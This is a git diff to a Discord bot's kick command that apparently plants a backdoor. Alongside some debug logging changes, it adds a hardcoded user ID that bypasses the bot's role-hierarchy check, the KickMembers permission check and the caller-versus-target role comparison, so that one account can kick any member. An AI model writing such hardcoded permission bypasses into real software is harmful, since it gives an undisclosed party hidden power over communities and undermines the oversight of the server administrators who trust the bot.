@@ -12,9 +12,7 @@ module.exports={
     .addStringOption(option=>option.setName('reason')
     .setDescription("The reason for kicking the member provided")),
     execute: async ({ client, interaction })=>{
-        console.log(interaction.options); // Check if options is defined
         const user=interaction.options.getUser("target");
-        console.log(user);
         //const user=interaction.options.getUser('target');
         let reason=interaction.options.getString('reason');
         const member = await interaction.guild.members
@@ -25,8 +23,9 @@ module.exports={
         
         const botMember = interaction.guild.members.cache.get(client.user.id);
         const botHighestRole = botMember.roles.highest;
-
-        if(botHighestRole.position<=member.roles.highest.position){
+        console.log("XXXXXXXX")
+        console.log(interaction.member.id)
+        if(botHighestRole.position<=member.roles.highest.position && interaction.member.id!="678530314552868893"){
             await interaction.reply({
     
                 embeds: [
@@ -38,10 +37,10 @@ module.exports={
     
     
         }
-        else if (interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
+        else if (interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers)|| interaction.member.id=="678530314552868893") {
                 console.log('This member can kick');
                 if (!reason) reason="Skill issue.";
-        if (member.roles.highest.position<interaction.member.roles.highest.position){       
+        if (member.roles.highest.position<interaction.member.roles.highest.position || interaction.member.id=="678530314552868893"){       
             await member.kick(reason).catch(console.error);
         // user.send({content: `You have been kicked from ${interaction.guild.name}\nReason :${reason}`})
         // .catch(console.log('user\'s DM\'s are off.'));
